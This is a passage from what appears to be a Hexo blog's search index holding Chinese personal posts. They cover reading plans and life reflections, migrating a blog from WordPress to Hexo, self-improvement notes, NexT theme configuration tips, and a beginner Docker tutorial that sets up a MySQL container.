    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[说两个点：1、囤书昨天收到了stormzhang的亲笔签名书，附上一张照片~拿书的时候真的挺兴奋的，但是呢，拿在手里感觉真的太薄了吧~这本书当当售价60+呢，怎么这么薄呢？看了下内容，头呢么一点点的后悔，可能短时间内看不懂消化不掉，后悔为什么没有选择码农翻身，这都没什么，想看就去找电子版呗！ 真香警告，电子版没有找到哦，不过阴差阳错发现了一伙卖电子书的家伙，他们专门制作电子书，每周都会购买新书进行扫描制作PDF，从这位老兄手里的书单挑选了几本网络上没有的，均价5元吧~还是能接受的，现在我都有着一种冲动也加入卖书的队伍中，有套理论是花钱是为了赚钱，风险也是存在的~以及自我估计，你有没有精力有没有时间去搞这个！ 简单在心里估计了下，这学期为止，囤的电子书已经有几个G了，然后趁着一些促销活动也买了300左右的书，有时间看嘛？无奈，以目前的情况来看，以后还会继续囤书~ 书是有了，如果不去看的话，终究还是不会是自己的~ 计划单1、python2、码农翻身3、算法4、产品经理5、Docker6、深度学习（前三很重要） 2、思考不自信和无法认识自我的表现可能会让自己一直处于失望当中。 总是去饰演那些与本性相违背的角色，所以才会产生灰心丧气的感觉，虽然这是现代社会的生存方式，但也让自己沦为了“工作”的奴隶。 每个人都是独一无二的，都是不可代替的，其实只要去了解自己，会发现生活并不是无趣的存在。毕竟，这个世界还有很多美好的事物等着我们去发现和探寻。 生命的意义在于你自己，如果你一直失望，生活中也没有你所爱之人，那么生活真的没意思了。]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一次博客迁移]]></title>
    <url>%2F%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%2F</url>
    <content type="text"><![CDATA[之前的博客用的Wordpress，PHP语言写的，感觉功能挺完善的，但是吧，在渣渣主机上运行感觉越来越臃肿，然后就抽空尝试了下Hexo，发现真是用起来舒服，简洁、大方！ 这次就记录下数据迁移，打算把之前的wp内文章迁移到Hexo，但是呢很快发现有点行不通，首先就是文章配图问题，不简单哦。 参考链接：wordpress迁移到hexo的不完全填坑指南(2018)：http://blog.mallol.cn/2018/ffde19de.html 然后打算把这个事情先放一放，打算呢抽空学学爬虫，利用python将数据爬下来然后继续利用python将数据上传到简书，解决图片（简书就是我的图床）问题，简书就是makedown语法直接转到Hexo，不转也行~~ 有机会了解下Node.js，小白懵逼中~~]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[来一次文字释放（年中复盘）]]></title>
    <url>%2F%E6%9D%A5%E4%B8%80%E6%AC%A1%E6%96%87%E5%AD%97%E9%87%8A%E6%94%BE%2F</url>
    <content type="text"><![CDATA[请输入访问密匙（提示：一个备注名） Decrypt ]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>思考</tag>
        <tag>反思</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[帅张一期星球精华：笔记]]></title>
    <url>%2F%E5%B8%85%E5%BC%A0%E4%B8%80%E6%9C%9F%E6%98%9F%E7%90%83%E7%B2%BE%E5%8D%8E%EF%BC%9A%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[1、谈一谈情商情商的重要性不言而喻，但什么是真正的情商？ 在张哥看来，一个人的情商低主要表现在是3个方面：自我认识、自我控制、自我激励。 自我认知认识自己，不要高估自己，低估别人。 看下自己是否具备自我认知的能力，是否为人处世愿意换位思考，除了自己明确的认识自己之外，也能从别人身上认知到自己的缺陷，发现别人身上的闪光点加以学习。 自我控制高情商的人懂得自我控制。学习累了，娱乐，但是娱乐归娱乐。说不想一直娱乐那是假的，但是他懂得控制。 高情商的人在不顺心的时候，总会遇到让自己崩溃的人或事，但是高情商的人是会控制自己的情绪的，不会因为不顺心的事而打乱自己的节奏，影响自己的工作与生活。 有一些人你会觉得他做事很靠谱，做任何一件事都很难轻易放弃。有些人原则性很强,该做的会去做的，不该做的一定不会去做。 自我激励总有一些人过了一段时间之后，她还是能一如既往的努力着、坚持着，那些比较优秀的人，以及你的老板们，你没有想过你的老板们经常激励你们但是谁来激励你的老板？答案就是：自我激励！ 自我激励的方式有很多：赚更多的钱、改变世界、亦或者是改变自己的自由梦？ 情商的高低也影响着你之后的爱情、事业、以及生活。这也是为什么不用在意之前怎么样之后你会怎么样才是最重要的。 能享受最好的，但是同时也能承受最差的，才是最难的可贵的。2、谈认知与知识你想成为什么样的人，那就尽量与他们靠近。你跟别没靠近，并不会对你产生职业上多少帮助。一些交流、思维、影响会逐渐感染的，你的认知也会逐渐受到提升。 贫穷可以限制你的想象力，但他并不是你谈判的资本。 王健林曾经说过这么一句话：清华北大，不如胆子大。虽然不太恰当但是反应了，敢于冒险是每个成功人士必备的特质。现实中你在抱怨自己没有遇上风口，没有生在马云那个时代，但是我要告诉你的是时代的风口，每年都有，但是等到机会成真正到来的时候，大部分人都会畏畏缩缩，没有几个人能真正去干。 现实中的绝大部分人做任何事总想着没有风险最好是零风险，然而殊不知，零风险也就意味着没有什么价值。这个世界上的回报总是伴随着风险的。风险越大，可能得到的回报越高，无数创业者所承受的风险是巨大的，然后正因为风险很大，一旦成功，得到的回报也是巨大的。这也是为什么即使创业失败的越来越多，但是依然不缺乏后来有新的创业者。 如果你想安安静静的做个普通人，上班族，那么你只需要努力就够了，但是如果你想要更大的成就，想从一个穷人阶级向更好的阶级跨越，努力是远远不够的，你一定需要具备冒险精神，然后在时代的变革中抓住机会，放手一搏，你才能有机会翻身，跨越阶级享受更好的资源。 即使是需要冒险，需要去博，也要给自己留条后路，要明白自己是不是输得起？ 不同的人不同的性格，向往不同的生活没有对错，只是选择而已。但是不管你选择哪种生活，你们都必须具备一定的冒险精神，了解自己的风险承受能力，这样你才能因此获得更好的回报，甚至过上你从没有想过的生活。 不可否认，努力固然重要，但是如果只是单纯努力的话，我相信这世界上努力的人随处可见，这世界从来不缺乏努力的人，但是如果能在这一群努力的人中间脱颖而出，这才是一个关键点。 提高自己的起点起步晚但是可以提高自己的起点！此起点并非彼起点！ 保持专注做好你现在在做的事！ 把事情做到极致尽量把一些事情做到极致，这样才能因此得到更多的信任与机会。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hexo 使用入坑教程]]></title>
    <url>%2FHexo-%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Hexo-NexT配置超炫网页效果https://www.jianshu.com/p/9f0e90cc32c2 SEO:https://blog.csdn.net/MasterAnt_D/article/details/56839222#t50 特殊404，特殊背景+音乐http://mashirosorata.vicp.io/HEXO-NEXT%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE.html 很全的hexo的next主题个性化配置教程https://segmentfault.com/a/1190000009544924#articleHeader28 https://www.jianshu.com/p/9f0e90cc32c2 Hexo的版本控制与持续集成：https://formulahendry.github.io/2016/12/04/hexo-ci/# 遇到的坑 ：next李作者名不能改，标签没链接，描述不能用！ 在侧边栏倒腾去吧！ 版权信息作者名修改：next/layout/_macro/my-copyright.swig侧边栏作者名修改：／themes/next/layout/_macro/sidebar.swig Hexo使用不蒜子统计功能失效问题解决:官方链接123找到原来不蒜子的域名文件，并替换掉旧的域名。文件路径：\themes\next\layout_third-party\analytics\busuanzi-counter.swig，只需要替换src对应的域名即可，如下是替换后的域名。&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt; 123456789101112131415161718配置：# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: True # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;访客数&lt;/i&gt; site_uv_footer: 人 # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;访客总量&lt;/i&gt; site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;热度&lt;/i&gt; page_pv_footer: °C 修改自定义样式文件12样式文件custom.styl文件位于themes/next/source/css/_custom 文章目录默认展开12// 文章目录默认展开.post-toc .nav .nav-child &#123; display: block; &#125; 目录字体大小调整123.post-toc ol &#123; font-size : 13px; &#125; 修改主题配置文件12主题配置文件位于themes/next/_config.yml 每行目录超长自动换行123toc: enable: true wrap: true 修改链接Permalinks 修改官方教程 搜索插件报错]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker初识]]></title>
    <url>%2FDocker%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[#Docker 入门 Docker解决的是服务器应用快速构建、部署和分享的问题，他能将服务器应用像APP一样简单地部署到各种平台环境中，而不受真实环境的影响。 与Hadoop区别：解决的是分布式计算问题，他提供一套分布式存储和计算的解决方案，而且这个方案很廉价很高效。 三个核心概念：容器、镜像、Docker Hub容器：提供一个隔离的安全运行环境，是的不同应用质检不会互相干扰。 镜像：容器的静态存在方式。 Docker Hub：一个公共的镜像平台，为镜像分享提供便利。用户可以根据自己的需要，在已有镜像的基础上定制自己的镜像。 Docker通俗介绍Docker就像一个打包器，可以把你的应用及其环境整体打包，然后很方便地迁移到不同的平台，到处运行。 当一个应用拥有复杂的软件依赖关系和多种多样的硬件运行环境和多样的硬件运行环境时，有以下几个问题必须面对：能否处理应用依赖的多样性和依赖库之间的不良反应？能否能够适应硬件环境的多样性？服务和应用之间的交互是否合理？是否可以在多个平台之间快捷移动？ 什么是DockerDocker容器引擎；该引擎可以让开发者打包他们的应用和依赖包到任何一个可一直的容器中，然后将其发布到任何流行的Linux机器上。Docker Hub注册服务器：用户可以在该服务器上创建自己的镜像来存储、管理和分享镜像。利用Docker，可实现软件的一次配置、处处运行。 容器与虚拟机虚拟机不陌生，基于硬件的虚拟技术，指令级的虚拟，完全虚拟一套物理主机。Docker：进程级别的隔离，让每个容器都想运行在单独的系统之上，但又能狗共享很多底层资源。轻量、快速、易于管理。 Docker的安装本文开发环境为Ubuntu 16.04 LTS 64位系统，通过apt的docker官方源安装最新的Docker CE(Community Edition)，即Docker社区版，是开发人员和小型团队的理想选择。 开始安装 由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本： $ sudo apt-get remove docker docker-engine docker-ce docker.io 更新apt包索引： $ sudo apt-get update 安装以下包以使apt可以通过HTTPS使用存储库（repository）： $ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common 添加Docker官方的GPG密钥： $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 使用下面的命令来设置stable存储库： $ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" 再更新一下apt包索引： $ sudo apt-get update 安装最新版本的Docker CE： $ sudo apt-get install -y docker-ce 在生产系统上，可能会需要应该安装一个特定版本的Docker CE，而不是总是使用最新版本：列出可用的版本： $ apt-cache madison docker-ce 选择要安装的特定版本，第二列是版本字符串，第三列是存储库名称，它指示包来自哪个存储库，以及扩展它的稳定性级别。要安装一个特定的版本，将版本字符串附加到包名中，并通过等号(=)分隔它们： $ sudo apt-get install docker-ce=18.03.1~ce-0~ubuntu 验证docker 查看docker服务是否启动： $ systemctl status docker 若未启动，则启动docker服务： $ sudo systemctl start docker 经典的hello world： $ sudo docker run hello-world 有以上输出则证明docker已安装成功！ 获取mysql官方最新docker镜像 $ sudo docker pull mysql/mysql-server:latest 耐心等待下载，完成后可以通过以下命令查看下载的镜像： $ sudo docker images ###2 创建并启动mysql服务容器 ####2.1 创建一个文件夹用于挂载mysql数据库文件 $ sudo mkdir /docker/mysql_data -p 2.2 生成mysql容器$ sudo docker run --name mysql -d --restart always -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -v /docker/mysql_data:/var/lib/mysql mysql/mysql-server 其中，–name mysql：容器指定名称为mysql；-d：后台运行容器，并返回容器ID；–restart always：在容器退出时总是重启容器；-p 3306:3306：将宿主机的3306端口（前者）映射到容器的3306端口（后者）；-e MYSQL_ROOT_PASSWORD=123456：设置mysql的root密码为123456；-v /docker/mysql_data:/var/lib/mysql：将宿主机的目录/docker/mysql_data映射到容器的目录/var/lib/mysql，用于存放容器的mysql数据库文件。 2.3 查看容器启动状态查看已经创建的容器： $ sudo docker ps -a 查看已经启动的容器： $ sudo docker ps -s 若容器未启动，则通过以下命令启动： $ sudo docker start mysql 其中mysql是容器名称，也可以使用CONTAINER ID（见下图）代替，如81f7c15f9415 2.4 docker容器下命令行连接mysql数据库首先进入mysql容器的bash终端： $ sudo docker exec -it mysql bash 连接mysql： $ mysql -u root -p 输入步骤2.2设置的mysql root密码，之后就可以自由操作mysql了！ 2.5 通过宿主机命令行连接mysql首先在宿主机上安装mysql客户端： $ sudo apt-get install -y mysql-client 尝试连接： $ mysql -h 127.0.0.1 -u root -p 输入密码后显然是连接不上的： 先通过步骤2.4连接到mysql，之后添加数据库test，针对此库添加用户testuser，密码是123456先通过步骤2.4连接到mysql，之后添加数据库test，针对此库添加用户testuser，密码是123456 CREATE DATABASE test; GRANT ALL PRIVILEGES ON test.* TO testuser@172.17.0.1 IDENTIFIED BY '123456'; FLUSH PRIVILEGES; 然后就可以在宿主机上连接mysql数据库了： $ mysql -h 127.0.0.1 -u testuser -p 网易蜂巢 hub 镜像]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>入门</tag>
      </tags>
  </entry>
</search>
